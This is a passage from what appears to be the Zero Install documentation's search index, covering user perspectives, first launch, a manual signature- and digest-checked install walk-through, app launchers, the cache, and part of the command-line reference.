developer</li> <li>Distribution maintainer</li> </ul>"},{"location":"about/perspectives/#novice-user","title":"Novice user","text":"<p>Linux distributions come with a lot of general purpose software, but sometimes a program you want isn't there. Maybe it's very new, or very specialised. Zero Install makes it easy for you to use extra software, but only if someone has gone to the trouble of making it available this way.</p> <ul> <li>You can get packages from anywhere, not just from your distribution.</li> <li>On the other hand, there's no guarantee that these packages are any good. Be careful.</li> <li>You don't need to enter the root password to install things.</li> <li>Installing programs only affects you, not other users of the computer.</li> </ul> <p>If you know the program you want is available this way, go to the downloads page and install the Zero Install package for your distribution.</p> <p>If you don't have a particular package in mind and you're just browsing, then you've probably come to the wrong place. Only a small number of programs are currently available this way, and we're mainly interested in building the tools that help other people to make packages rather than in making lots of packages ourselves.</p>"},{"location":"about/perspectives/#power-user","title":"Power user","text":"<p>Power users are probably the ideal audience for Zero Install. Zero Install is all about putting you in control of your computer:</p> <ul> <li>You can get packages from anywhere, not just from your distribution.</li> <li>When installing a package, the package can't change your configuration. Packages can't add anything to your boot sequence, for example.</li> <li>Of course, actually running them might do bad things. But Zero Install makes it easy to share programs and libraries between sandboxes.</li> <li>You can upgrade to the latest testing version, or roll back to any previous version of any program or library.</li> <li>You can download binaries or compile from source.</li> </ul> <p>How do I ...</p> ... get started? Go to the downloads page and install the Zero Install Injector package. Then follow the tutorial. ... change to a different version of something? Different desktop environments provide different ways to do this, but you can always use the command line. <code>0install list</code> shows the URI of every program in your cache. <code>0install run -g URI</code> opens the GUI for selecting different versions of that program. ... compile from source? Open the GUI (see above), right click on the program or library to compile and choose Compile... from the menu. See the 0compile page for details. ... reinstall something? You should never need to reinstall anything. Zero Install puts each package in a read-only cache directory, indexed by a cryptographic digest of the contents. Therefore, reinstalling is guaranteed to have no effect! If you think the cache has got corrupted somehow, you can run <code>0install store audit</code> to check it. Deleting the program's configuration files may help, though."},{"location":"about/perspectives/#system-administrator","title":"System administrator","text":"<p>Your users want you to install all kinds of odd programs for them, but you know that installing a bad package for one user could mess up all your other users. It's a tough choice. You either risk it, or tell them to install the program in their home directory. But that's hard work for them, and it wastes your disk space and network bandwidth if several users want the same program. Also, they never remember to check for updates.</p> <p>Zero Install lets your users install programs in a way that's as secure as installing to their home directories, but is easier, allows sharing between users and makes it easy for them to get automatic updates.</p> <p>How do I ...</p> ... get started? Go to the downloads page and install the Zero Install Injector package. Your users can now install programs to their home directories easily. ... set up sharing of downloads? Follow the setting up sharing instructions. Now when a user installs a program, it ends up in <code>/var/cache/0install.net</code> (the sharing instructions explain why this is safe). ... add programs to everyone's desktop? You can add launchers to <code>$PATH</code> using <code>0install add</code>, and you can add menu entries using <code>0desktop</code>. Put the scripts or .desktop files in a common directory, just as with any other program. You should set up sharing before doing this, or every user will have to download a separate copy of the program. ... limit which programs can be installed? This is not yet supported. Talk to us!"},{"location":"about/perspectives/#software-developer","title":"Software developer","text":"<p>You don't have much free time, and you want to spend as much of it as possible writing code, not hanging around on distribution mailing lists and IRC channels trying to find someone to review the dozens of packages you've had to create. Life's too short for that.</p> <p>Creating a Zero Install feed for your programs is easy (it's essentially the same information about download locations and dependencies you would put on your web-page anyway, but in a machine-readable form). Then anyone with Zero Install can use your program.</p> <ul> <li>Create one package that works everywhere, not one package per Linux distribution.</li> <li>No need to be approved by a distribution before people can start using your programs.</li> <li>Specify dependencies in a distribution-neutral format.</li> <li>Use dependencies which aren't available in all distributions.</li> <li>Provide new versions immediately. No more waiting six months for the distribution's next release before you can get a fix out.</li> </ul> <p>How do I ...</p> ... create a feed for my program? Follow the Packaging Guide. ... push updates to my users? Users poll for updates (as with RSS), by default once a month. You should initially mark new releases as 'testing' so that only more advanced users (who know how to roll back to previous versions if something goes wrong) get them. ... check that my feed is OK? Use FeedLint to test it."},{"location":"about/perspectives/#distribution-maintainer","title":"Distribution maintainer","text":"<p>Installing anything that's not in your distribution is too hard for most of your users, so you've had to package up thousands of programs with minimal testing. Keeping on top of security updates and new releases is taking up all your time, and release testing drags on for months as you try to find a set of versions that supports all packages simultaneously.</p> <ul> <li>Instead of doing everything yourself, let the upstream maintainers do most of the work for you. They'll create packages, test them, provide updates and deal with bug reports. Unless you actually want to change something, you don't need to do anything.</li> <li>Dependencies are resolved on a per-program basis. If two programs can use the same version of a library then that's great; they'll share it. If not, then two copies of the library will co-exist. This is all automatic.</li> </ul> <p>How do I ...</p> ... override a package's default configuration? Put your defaults in <code>/etc</code> as normal and the package should pick them up (though it depends on the program, of course). ... override a dependency of a Zero Install package to use my custom packaged library? You can register an additional feed in <code>/usr/share/0install.net</code>. See Distribution Integration for details. ... suggest suitable Zero Install packages for my users? See the instructions for administrators above. You just provide launchers. Each program will get installed when the first user runs it. ... sign off upstream versions I've tested? This is not yet supported. Talk to us! <p>In general, we welcome better integration with distributions, so write to our mailing list and we'll work something out!</p>"},{"location":"basics/","title":"Introduction","text":"<p>A 0install application is distributed using a feed file. A feed is an XML file that tells 0install how to run the application, and which versions are available. The feed file is normally published on the web; the URL of the feed is the unique identifier of the application.</p> <p>For example, Visual Studio Code is available via 0install. It has this feed file: https://apps.0install.net/gui/vs-code.xml</p> <p>To get a 0install application:</p> <ol> <li> <p>Find a program you want to run on the web:</p> <p></p> </li> <li> <p>Either launch it directly:</p> <pre><code>0install run https://apps.0install.net/gui/vs-code.xml\n</code></pre> <p>Or create a menu entry or command-line alias to launch it later.</p> </li> </ol>"},{"location":"basics/alias/","title":"Create a command-line alias","text":"<p>The <code>0install add</code> command allows you to create command-line aliases:</p> <pre><code>$ 0install add code https://apps.0install.net/gui/vs-code.xml\n$ code\n</code></pre> Linux / macOSWindows <p>See Apps for details.</p> <p>See Desktop integration for details.</p>"},{"location":"basics/first-launch/","title":"First launch","text":"<p>When launching a feed for the first time, 0install will download the necessary files for you and store them in the cache. Next time, 0install will use these stored files, so you don't need to download the program again. From time to time 0install will check for updates and offer to download them.</p> Linux / macOSWindows <ol> <li> <p>Use the command-line start a feed</p> <pre><code>0install run https://apps.0install.net/gui/vs-code.xml\n</code></pre> </li> <li> <p>Click Download</p> <p></p> <p>The feed says which dependencies the select program needs. Each dependency is identified by a web address (URL) in the same way that the main program was. 0install downloads information about them in the same way and selects a compatible set of versions. The window displays a dialog box showing the program and all required libraries. Click Download.</p> </li> <li> <p>Wait for the download to finish</p> <p></p> <p>0install now downloads all the required archives (supported formats include tar.gz, tar.bz2, zip, rpm and deb). It unpacks each one into its own directory and checks its contents against the cryptographic digest given in the (signed) feed file. If the archive has been changed since the feed was signed, the download will be rejected. If the archive hasn't been tampered with, it is stored in a cache directory (see sharing for more information) in its own subdirectory, named after the digest. This ensures that no two downloads can conflict with each other.</p> </li> </ol> <ol> <li> <p>Pick an application</p> <p></p> <p>Launch Zero Install and choose an application in the Catalog, e.g., Visual Studio Code. Click Run.</p> </li> <li> <p>Wait for the download to finish</p> <p></p> <p>Zero Install now downloads application as well as dependencies needed to run it, e.g., Visual Studio Code and Git. It unpacks each into its own directory and checks its contents against the cryptographic digest given in the (signed) feed file. If the archive has been changed since the feed was signed, the download will be rejected. If the archive hasn't been tampered with, it is stored in a cache directory in its own subdirectory, named after the digest. This ensures that no two downloads can conflict with each other.</p> </li> </ol> <p>You can also use the command-line to launch applications with 0install. For example, to download and start Python:</p> <pre><code>&gt; 0install run https://apps.0install.net/python/python.xml\nDownloading https://apps.0install.net/python/python.xml...\n[====================] Complete\nDownloading https://apps.0install.net/python/python.xml/upstream.xml...\n[====================] Complete\nDownloading https://apps.0install.net/python/python.xml-win32...\n[====================] Complete\nDownloading https://www.python.org/ftp/python/3.7.3/python-3.7.3-embed-amd64.zip...\n[====================] Complete\nExtracting archive...\n[====================] Complete\nGenerating sha256new manifest...\n[====================] Complete\nPython 3.7.3 (v3.7.3:ef4ec6ed12, Mar 25 2019, 22:22:05) [MSC v.1916 64 bit (AMD64)] on win32\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt;\n</code></pre>"},{"location":"basics/menu/","title":"Create a menu entry","text":"<p>Menu entries provide an easy way to run a program without entering the full URI, just like a bookmark in a web-browser provides an easy way to return to a web page without entering the full URL.</p> <p>Different environments provide different ways to add menu entries:</p> GNOMEKDEROXmacOSWindows <p>Choose Zero Install -&gt; Add New Program from the Applications menu. Type in the URI, or drag it from the web-browser into the dialog box.</p> <p></p> <p>Ubuntu users</p> <p>You need to open and then close the menu editor after adding a program before it will show up; see Ubuntu bug #191958. You can also run programs directly by choosing Manage Programs from the menu.</p> <p>Choose Add Zero Install Program from the Utilities menu. Type in the URI, or drag it from the web-browser into the dialog box.</p> <p></p> <p>Drag the link from your web-browser to the AddApp program, then drag the launcher from there to wherever you want it. AddApp's page has more details.</p> <p></p> <p>Copy the link from your web-browser to the AddApp program, then save the launcher from there to wherever you want it.</p> <p></p> <p>Zero Install allows you to integrate applications into your desktop environment as you are accustomed to from classic setup programs: Start menu entries, file type associations, entries in context menus, etc.. All the advantages of Zero Install such as automatic updates, parallel usage of multiple application versions and easy application removal are preserved.</p> <p>Open Zero Install and search for an app in the Catalog. Click on the  button to add it to \"My Apps\". Then click on Integrate in the pop-up box to add it to the start menu.</p> <p></p> <p>See Desktop integration for details.</p>"},{"location":"details/","title":"Manual walk-through","text":"<p>In this guide we install a program which is available through Zero Install, but without using the Zero Install software itself. Instead, we will perform each step manually, as an educational experience.</p>"},{"location":"details/#pick-a-program","title":"Pick a program","text":"<p>Choose a program to install from the list of feeds. A program with one dependency is ideal (the more it has, the longer it will take you to install it!). I'll be using Edit for this example.</p> <p>Open the feed for Edit above in your browser. The feed is an XML file listing the available versions of Edit. Your browser should render it as a web-page:</p> <p></p> <p>Use View Source to see the XML. We'll use this information to download and run Edit.</p>"},{"location":"details/#security-note","title":"Security note","text":"<p>Why should we trust this XML document? Who made it? Could someone have tampered with it?</p> <p>Each Zero Install feed has a digital signature. You can find it at the end of the feed. It looks something like this:</p> <pre><code>...\n&lt;/interface&gt;\n&lt;!-- Base64 Signature\niD8DBQBGBkYcrgeCgFmlPMERAuP4AJ45BlLx1w3ocxuLIFHzM4RfIAg4hgCfWRQ/0JOjU7tIjErm\nU3Vrz97gJk8=\n\n--&gt;\n</code></pre> <p>This is a GnuPG signature, but Base64-encoded so that it can go in an XML document. To check it, we need to reverse the encoding, which is easily done with a little Python. Save the two lines of random-looking characters to a file (<code>encoded-signature</code>) and decode it:</p> <pre><code>$ base64 --decode &lt; encoded-signature &gt; signature\n</code></pre> <p>Now remove the whole signature block from the XML (every line from <code>&lt;!-- Base64 Signature</code> onwards), save it as <code>Edit.xml</code>, and check it with GPG:</p> <pre><code>$ gpg --keyid-format=long signature \nDetached signature.\nPlease enter name of data file: Edit.xml\ngpg: Signature made Sun 25 Mar 2007 10:51:24 BST\ngpg:                using DSA key AE07828059A53CC1\ngpg: Good signature from \"Thomas Leonard ...\n</code></pre> <p>If you don't have the feed author's key, you can get it from various places (in the normal way), or by fetching it from the same directory as the feed, e.g.:</p> <pre><code>$ wget http://rox.sourceforge.net/2005/interfaces/AE07828059A53CC1.gpg\n$ gpg --import AE07828059A53CC1.gpg \n</code></pre> <p>This all tells you that the XML file was created by the owner of the key and hasn't been tampered with. How you decide to trust the key itself is up to you, but one way is to check it using the default key information server:</p> <pre><code>$ gpg --with-colons --fingerprint AE07828059A53CC1 | grep fpr\nfpr:::::::::92429807C9853C0744A68B9AAE07828059A53CC1:\n$ wget -qO - https://keylookup.0install.net/key/92429807C9853C0744A68B9AAE07828059A53CC1\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;key-lookup&gt;\n  &lt;item vote=\"good\"&gt;Thomas Leonard created Zero Install and ROX.\n    This key is used to sign updates to the injector; you should accept it.\n  &lt;/item&gt;\n  &lt;item vote=\"good\"&gt;This key belongs to a Debian Maintainer.&lt;/item&gt;\n&lt;/key-lookup&gt;\n</code></pre> <p>In any case, you should make a note of which key was used so you can ensure it's the same later, when you check for updates.</p>"},{"location":"details/#pick-a-version","title":"Pick a version","text":"<p>Edit's feed lists several versions. I'll pick the latest one: version 2.0. If you find that version to be buggy, you might make a note of that and try a different version. Some may have been released recently and be marked as \"testing\". Whether you skip such versions is up to you. The relevant section of the XML file is this bit:</p> <pre><code>  &lt;group main=\"Edit/AppRun\"&gt;\n    &lt;requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"&gt;\n      &lt;environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/&gt;\n    &lt;/requires&gt;\n...\n    &lt;implementation id=\"sha1=329e6c0191f65ef2996b49837d04c4cfe6934758\"\n                    released=\"2005-09-21\" stability=\"stable\" version=\"2.0\"&gt;\n      &lt;archive extract=\"edit-2.0\"\n               href=\"http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz\" size=\"61195\"/&gt;\n    &lt;/implementation&gt;\n  &lt;/group&gt;\n</code></pre> <p>This tells us that we can get Edit version 2.0 by downloading edit-2.0.tgz and extracting the <code>edit-2.0</code> directory inside it:</p> <pre><code>$ wget http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz\n$ tar xzf edit-2.0.tgz edit-2.0\n$ ls edit-2.0\nEdit\n</code></pre>"},{"location":"details/#security-note_1","title":"Security note","text":"<p>How do we know the archive hasn't been tampered with? The author of the XML feed calculated a cryptographic digest of the archive's contents and stored it in the feed:</p> <pre><code>&lt;implementation id=\"sha1=329e6c0191f65ef2996b49837d04c4cfe6934758\"\n                released=\"2005-09-21\" stability=\"stable\" version=\"2.0\"&gt;\n  &lt;archive extract=\"edit-2.0\"\n           href=\"http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz\" size=\"61195\"/&gt;\n&lt;/implementation&gt;\n</code></pre> <p>We can calculate the value ourselves from the directory and compare (we already verified the signature on the feed, so we know that one's OK). Calculating the value is a little tricky; you have to create a manifest file listing all the files and directories in the archive, along with their digests too, by following these instructions. We'll cheat, by using <code>0install</code> to generate it for us:</p> <pre><code>$ 0install digest edit-2.0 --algorithm=sha1 --manifest --digest\nD 1127294333 /Edit\nF 0cfc0b0c42b4f4c077f005f31ea1801a8e43bde0 1053080001 3409 .DirIcon\n...\nX d6f4507353737e35ce7af5ab10a589e5a644bec5 1106998691 1472 testreplace.py\nsha1=329e6c0191f65ef2996b49837d04c4cfe6934758\n</code></pre> <p>This says we have a directory called <code>Edit</code> containing a file called <code>.DirIcon</code>, and so on. The last line isn't part of the manifest; it's the digest of the manifest itself. It is this value that must match the id in the feed. It's useful to save the manifest output (minus the last line) in case we want to do an audit later:</p> <pre><code>$ 0install digest edit-2.0 --algorithm=sha1 --manifest &gt; edit-2.0/.manifest\n</code></pre> <p>This file will have the digest we require:</p> <pre><code>$ sha1sum edit-2.0/.manifest \n329e6c0191f65ef2996b49837d04c4cfe6934758  edit-2.0/.manifest \n</code></pre>"},{"location":"details/#run-it","title":"Run it!","text":"<p>We've downloaded and unpacked Edit. How do we run it? We don't have to guess; the answer is in the XML feed file:</p> <pre><code>  &lt;group main=\"Edit/AppRun\"&gt;\n</code></pre> <p>There was no <code>main</code> attribute on the <code>implementation</code> element, so we look in the containing group and find one. This tells us that we can run the program by executing the file <code>Edit/AppRun</code> inside the unpacked directory.</p> <pre><code>$ ./edit-2.0/Edit/AppRun\n*** This program needs ROX-Lib2 (version 1.19.14) to run.\n</code></pre> <p>If the program you picked didn't have any dependencies then it should now run (lucky you!). But, like many programs, Edit needs libraries to work.</p>"},{"location":"details/#resolving-dependencies","title":"Resolving dependencies","text":"<p>Our program needs some libraries before it will run. Which ones? Again, the feed XML tells us:</p> <pre><code>  &lt;group main=\"Edit/AppRun\"&gt;\n    &lt;requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"&gt;\n      &lt;environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/&gt;\n    &lt;/requires&gt;\n</code></pre> <p>We need a library called <code>http://rox.sourceforge.net/2005/interfaces/ROX-Lib</code>. You might already have one somewhere, or your distribution might carry it. If all else fails, we could try to guess where a suitable feed might be... http://rox.sourceforge.net/2005/interfaces/ROX-Lib seems like a good place to start...</p> <p>Go back to step 1! You need to download ROX-Lib's feed, check the signature, pick a version, download and unpack the archive, check the contents' digest, and check whether ROX-Lib in turn depends on other libraries (it doesn't).</p>"},{"location":"details/#running-with-dependencies","title":"Running with dependencies","text":"<p>OK, so you've got ROX-Lib too now. Things should look like this:</p> <pre><code>$ ls\nedit-2.0  Edit.xml  rox-lib2-2.0.3  ROX-Lib.xml\n</code></pre> <p>How can we tell Edit where we put ROX-Lib? Again, the answer is in Edit's XML file:</p> <pre><code>  &lt;group main=\"Edit/AppRun\"&gt;\n    &lt;requires interface=\"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\"&gt;\n      &lt;environment insert=\"ROX-Lib2/python\" name=\"PYTHONPATH\"/&gt;\n    &lt;/requires&gt;\n</code></pre> <p>We need to add a directory inside our unpacked ROX-Lib to the <code>$PYTHONPATH</code> environment variable, and then try running Edit again:</p> <pre><code>$ export PYTHONPATH=rox-lib2-2.0.3/ROX-Lib2/python\n$ ./edit-2.0/Edit/AppRun\n</code></pre> <p>Finally Edit runs!</p>"},{"location":"details/#review","title":"Review","text":"<p>So, what have we achieved? We've installed a program and its dependencies. We haven't touched anything outside of our test directory; no other programs on the system have been affected by this installation. We didn't need root access. We can undo the installation just by deleting our two XML files and the two unpacked archives.</p> <p>We didn't need to run any code from either Edit or ROX-Lib to perform the installation (we only ran them to test that it worked). If you have software for running programs in a restricted environment, you can install and run programs without even giving them write access to their own code.</p> <p>Finally, although it may have been a little tedious, everything we did could be automated. You could write a program to do all this for you (or use ours!).</p>"},{"location":"details/#tidying-up","title":"Tidying up","text":"<p>Our home directory will become a big mess if we just install things in random directories. When we want to run another program that uses ROX-Lib, we'll want to be able to find the copy we already installed rather than downloading another copy.</p> <p>These files don't really need to be backed up. If we lost them, we could just download them again from the web. So, we'll put them in the <code>~/.cache</code> directory which is designed for just this purpose. In fact, to avoid conflicts with other things using this directory, we'll keep everything under <code>~/.cache/0install.net</code>, because it's all related to Zero Install.</p> <p>We have two XML files and two directories. What should we call them? It's not impossible to imagine there being two programs in the world both called Edit, so that's not a good name; we wouldn't know what to do if we wanted both on our system at once! A good choice is to use the full URL of Edit's feed for the XML file (replacing <code>/</code> characters with %2f in the traditional web way):</p> <pre><code>$ mv Edit.xml \\\n     ~/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fEdit\n</code></pre> <p>It's a bit ugly, but at least it's unique and we can find it again. We'll store ROX-Lib's XML in the same way:</p> <pre><code>$ mv ROX-Lib.xml \\\n  ~/.cache/0install.net/interfaces/http%3a%2f%2frox.sourceforge.net%2f2005%2finterfaces%2fROX-Lib\n</code></pre> <p>What about the directories with the actual program files? We could use the same strategy, naming it from the URL where we got it, but this has some problems. For example, there might be lots of places where you can get the archive (mirrors, peer-to-peer, CD-ROM, etc). We don't care how we got it, all we care about is that it has the right digest. So, we'll name it after that!</p> <pre><code>$ mv edit-2.0 ~/.cache/0install.net/implementations/sha1=329e6c0191f65ef2996b49837d04c4cfe6934758\n$ mv rox-lib2-2.0.3 ~/.cache/0install.net/implementations/sha1=6a2e548a80368bd8c2b5b3abedccf9a0a6cb4333\n</code></pre> <p>This is exactly the scheme that <code>0install</code> uses. We can test this quite easily:</p> <pre><code>$ 0install run --offline http://rox.sourceforge.net/2005/interfaces/Edit\n</code></pre> <p>Zero Install runs Edit without downloading anything. It is able to use the files we downloaded and placed in its cache manually.</p>"},{"location":"details/apps/","title":"Apps","text":"<p>Zero Install allows you to create command-line launchers called \"apps\" using the <code>0install add</code> command:</p> <pre><code>$ 0install add code https://apps.0install.net/gui/vs-code.xml\n$ code\n</code></pre> <p>When run, they trigger a background update if they haven't been updated for a while. You can also update them manually:</p> <pre><code>$ 0install update rox\nNo updates found. Continuing with version 2.11.\n</code></pre> <p>Note</p> <p>The following features are not supported on Windows yet.</p> <p>Apps store their current selections (in <code>~/.config/0install.net/apps/rox/selections.xml</code> in this case). This means that they start slightly faster than using <code>0install run URI</code>, because the solver isn't needed.</p> <p>They also remember any restrictions (e.g. <code>--before</code>).</p> <p>Each app also stores past selections (max one set per day) so if an update goes wrong you can see what changed and roll-back easily:</p> <pre><code>$ 0install whatchanged 0publish\nLast checked    : Wed Jun 27 20:24:19 2012\nLast update     : 2012-06-27\nPrevious update : 2012-06-16\n\nhttps://apps.0install.net/0install/0install-python.xml: 1.8-post -&gt; 1.9-post\nhttps://apps.0install.net/utils/gnupg.xml: new -&gt; 1.4.12-4\n</code></pre> <p>To run using the previous selections, use:</p> <pre><code>$ 0install run ~/.config/0install.net/apps/0publish/selections-2012-06-16.xml\n</code></pre>"},{"location":"details/cache/","title":"Cache","text":"<p>Everything 0install downloads from the net by default goes in <code>~/.cache/0install.net/</code> on Linux or <code>%localappdata%\\0install.net</code> on Windows (see File locations). Every application/library unpacks into a directory in that cache. So, there's one directory for Visual Studio Code, and another for Blender, etc. In fact, there's one directory for every version of Visual Studio Code, in case you want more than one available. Every directory is uniquely named, so you'll never get conflicts when trying to install two different programs.</p> <p>The idea is that you don't need to backup <code>~/.cache</code>, because you can always download the stuff again. For example, if you delete the whole <code>~/.cache/0install.net/</code> directory and then click on Visual Studio Code, it will just prompt you to download it again. The cache is just to make things faster (and work when offline), but you don't really need to worry about it.</p>"},{"location":"details/cache/#sharing-implementations","title":"Sharing Implementations","text":""},{"location":"details/cache/#between-users-of-the-same-system","title":"Between users of the same system","text":"<p>0install can be configured to store its cache in <code>/var/cache/0install.net/</code> on Linux or <code>C:\\ProgramData\\0install.net</code> on Windows. This allows sharing between users. The use of cryptographic digests makes this safe; users don't need to trust each other not to put malicious code in the shared cache.</p> <ul> <li>See: Enabling sharing between users</li> </ul>"},{"location":"details/cache/#between-virtual-machines","title":"Between virtual machines","text":"<p>You can also share the cache between virtual machines:</p> <ul> <li>See: Enabling sharing between virtual machines</li> </ul>"},{"location":"details/cache/#between-machines-using-p2p","title":"Between machines using P2P","text":"<p>Warning</p> <p>This is still experimental.</p> <p>Using 0share you can locally distribute your implementations (versions of programs) via a peer-to-peer protocol.</p>"},{"location":"details/cache/#removing-implementations","title":"Removing Implementations","text":"<p>If for some reason you would like to remove implementations from the cache (it does not make your system any 'cleaner', but it does free some disk space), you can do so using the Zero Install Cache dialog.</p> Linux / macOSWindows <p>Click on the Show Cache button in the Manage Programs box to get the cache explorer (or run <code>0install store manage</code>). Select the versions you don't need anymore and click on Delete.</p> <p></p> <p>Open the main GUI of Zero Install and click on Tools and Cache management (or run <code>0install store manage</code>). Select the versions you don't need anymore and click on Remove.</p> <p></p> <p>You can also run <code>0install update-all --clean</code> to update all apps registered with desktop integration and remove any old versions from the cache afterwards.</p> <p>Tip</p> <p>You can delete the entire cache, 0install will redownload whatever it needs later.</p>"},{"location":"details/cli/","title":"Command-line interface","text":"<p>Zero Install command-lines begin with <code>0install</code>. On Windows you can also use <code>0install-win</code> instead. This will display outputs using windows instead of the console.</p> Command Description <code>select</code> Selects a version of the program identified by URI, and compatible versions of all of its dependencies. Returns an exit status of <code>0</code> if it selected a set of versions, and a status of <code>1</code> if it could not find a consistent set. <code>download</code> Behaves similarly to <code>0install select</code>, except that it also downloads the selected versions if they are not already cached. Returns an exit status of <code>0</code> if it selected a suitable set of versions and they are now all downloaded and in the cache; returns a status of <code>1</code> otherwise. <code>update</code> Checks for updates to the program and download them if found. This is similar to <code>0install download --refresh</code>, except that it prints information about whether any changes were found. <code>run</code> Behaves similarly to <code>0install download</code>, except that it also runs the program after ensuring it is in the cache. Returns an exit status of <code>1</code> if the download step failed. Otherwise, the exit status will be the exit status of the program being run. <code>import</code> Imports a feed from a local file, as if it had been downloaded from the network. This is useful when testing a feed file, to avoid uploading it to a remote server in order to download it again. The file must have a trusted digital signature, as when fetching from the network. <code>export</code>(Windows only) Exports all feeds and implementations required to launch the program specified by a <code>URI</code> to a <code>DIRECTORY</code>. <code>search</code> Searches for feeds indexed by the mirror server that match specified keywords. Note that the default mirror server indexes all known feeds, regardless of quality; you must decide whether to trust the programs before running them. <code>list</code> Lists all locally known feed URIs. If a search term is given, only URIs containing that string are shown (case insensitive). <code>catalog search</code>(Windows only) Searches registered catalogs for applications that match the specified query. If no query is given all applications in the catalogs are listed. <code>catalog refresh</code>(Windows only) Refreshes (downloads) all registered catalogs. <code>catalog add</code>(Windows only) Adds an URI to the list of catalogs. <code>catalog remove</code>(Windows only) Removes an URI from the list of catalogs. <code>catalog reset</code>(Windows only) Resets the list of catalogs to the default source. <code>catalog list</code>(Windows only) Lists all registered catalogs. <code>config</code> View or change configuration settings. With no arguments, it displays all settings and their current values. With one argument, it displays the current value of the named setting. With two arguments, it sets the setting to the given value or resets it to the default value if the value <code>default</code> is given. <code>trust add</code>(Windows only) Trusts feeds from a specific `DOMAIN` when [signed](../specifications/feed.md#digital-signatures) with a specific `FINGERPRINT`. <code>trust remove</code>(Windows only) Stops trusting feeds [signed](../specifications/feed.md#digital-signatures) with a specific `FINGERPRINT`. Only stops trusting for a specific `DOMAIN`, if specified. <code>trust list</code>(Windows only) List keys trusted for [signing](../specifications/feed.md#digital-signatures) feeds. Only list domains for which a specific `FINGERPRINT` is trusted, if specified. <code>add-feed</code> Register an additional source of implementations (versions) of a program. <code>remove-feed</code> Un-registers a feed, reversing the effect of <code>0install add-feed</code>. <code>list-feeds</code> Lists all extra feeds added to URI using <code>0install add-feed</code>. <code>digest</code> Calculates the manifest digest of a directory or archive. <code>store add</code> Adds the contents of a directory or archive to the cache. <code>store audit</code> Checks that all implementations in the cache are undamaged. Additional arguments specify custom cache locations. <code>store copy</code> Copies an implementation into the cache. Similar to <code>0install store add</code>, but the digest is extracted from the directory name. An additional arguments specifies a custom target cache location. <code>store export</code>(Windows only) Exports a cached implementation as an archive (ZIP, TAR, etc.). The result can be imported on another machine using <code>0install store add</code>. <code>store find</code> Determines the local path of a cached implementation. <code>store list</code> Lists all implementation cache directories. <code>store list-implementations</code>(Windows only) Lists all cached implementations. If a feed URI is specified only implementations for that particular feed are listed. <code>store manage</code> Displays a graphical user interface for managing implementations in the cache. Shows associations with cached feeds. <code>store optimise</code> Saves disk space by merging identical files with hardlinks. Additional arguments specify custom cache locations. <code>store purge</code>(Windows only) Removes all implementations from the cache. Use this command to clean up the system before removing Zero Install. Deleting cache directories manually may be difficult due to the NTFS ACLs employed to protect implementations against modification. Additional arguments specify custom cache locations. <code>store remove</code> Removes an implementation from the cache. <code>store verify</code> Makes sure an implementation has not been damaged (i.e. it manifest digest has not changed). <code>store serve</code> <code>store add-dir</code>(Windows only) Adds a directory to the list of custom implementation caches. <code>store remove-dir</code>(Windows only) Removes a directory from the list of custom implementation caches. <code>central</code>(Windows only) Opens the central graphical user interface for launching and managing applications. <code>add</code> Add an application to the application list. <code>remove</code>(Windows only) Removes an application from the application list and undoes any desktop environment integration. <code>remove-all</code>(Windows only) Removes all applications from the application list and undoes any desktop environment integration. Use this command to clean up the system before removing Zero Install. <code>destroy</code>(Linux only) Removes an application. <code>show</code>(Linux only) Shows the current selections for an application <code>whatchanged</code>(Linux only) Shows the differences between the current and previous selections for an application. <code>man</code>(Linux only) Shows the man-page of a given command. <code>integrate</code>(Windows only) Adds an application to the application list (if missing) and integrate it into the desktop environment. <code>alias</code>(Windows only) Create an alias for launching an application via 0install without always having to enter the full URI. <code>list-apps</code>(Windows only) Lists all applications currently in your application list. If a search term is given, only application names containing that string are shown (case insensitive). <code>update-all</code>(Windows only) Updates all applications in the application list. <code>repair-all</code>(Windows only) Reapplies all desktop integrations of applications in the application list. <code>sync</code>(Windows only) Synchronizes the application list with the server. <code>import-apps</code>(Windows only) Imports a set of applications and desktop integrations from an existing app-list.xml file. <code>self deploy</code>(Windows only) Deploys Zero Install to the specified <code>TARGET</code> directory or the default directory for programs and integrates it in the system. <code>self remove</code>(Windows only) Removes the current instance of Zero Install from the system. <code>self update</code>(Windows only) Updates Zero Install itself to the most recent version."},{"location":"details/cli/#select","title":"select","text":"<p>Selects a version of the program identified by URI, and compatible versions of all of its dependencies. Returns an exit status of <code>0</code> if it selected a set of versions, and a status of <code>1</code> if it could not find a consistent set.</p> <p>Usage: <code>0install select [OPTIONS] URI</code></p> Option Description <code>-?</code><code>-h</code><code>--help</code> Show the built-in help text. <code>--background</code>(Windows only, GUI only) Hide the graphical user interface and use something like a tray icon instead. <code>--batch</code>(Windows only) Automatically answer questions with defaults when possible and simplify console output (no tables or progress bars). <code>-v</code><code>--verbose</code> More verbose output. Use twice for even more verbose output. <code>--customize</code>(Windows only) Show the graphical policy editor. This allows you to customize which version of a program or library to use. <code>-o</code><code>--offline</code> Run in off-line mode, overriding the default setting. In off-line mode, no interfaces are refreshed even if they are out-of-date, and newer versions of programs won't be downloaded even if the injector already knows about them (e.g. from a previous refresh). <code>-r</code><code>--refresh</code> Fetch fresh copies of all used feeds. <code>--with-store <code>DIR</code></code> Add <code>DIR</code> to the list of implementation caches to search. However, new downloads will not be written to this directory. <code>--command <code>COMMAND</code></code> Instead of executing the default command, use <code>COMMAND</code> instead. Possible command names are defined in the program's interface. Set to empty (<code>\"\"</code>) to ignore the command during selection. <code>--before <code>VERSION</code></code> Require a version of the main program earlier than <code>VERSION</code>. i.e., force the use of an old version the program. <code>--not-before <code>VERSION</code></code> Require a version of the main program not earlier than <code>VERSION</code>. E.g., if you want to run version 2.0 or later, use <code>--not-before=2.0</code>. <code>--version <code>RANGE</code></code> Require a version of the main program within the given <code>RANGE</code>. Ranges are separated by pipes (<code>|</code>). Each range is in the form <code>START..!END</code>. The range matches versions where <code>START</code> &lt;= <code>VERSION</code> &lt; <code>END</code>. The start or end may be omitted. 